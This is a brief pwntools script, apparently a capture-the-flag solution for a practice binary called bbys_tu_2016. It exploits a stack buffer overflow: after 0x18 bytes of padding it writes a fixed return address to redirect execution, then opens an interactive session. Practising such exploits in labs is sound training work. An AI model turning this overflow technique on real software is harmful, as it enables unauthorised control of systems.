from pwn import *
#io = process('./bbys_tu_2016')
io = gdb.debug('./bbys_tu_2016')
padding = b'A'*0x18
payload = padding + p32(0x0804856D)
io.sendlineafter(b'This program is hungry. You should feed it.\n',payload)
io.interactive()
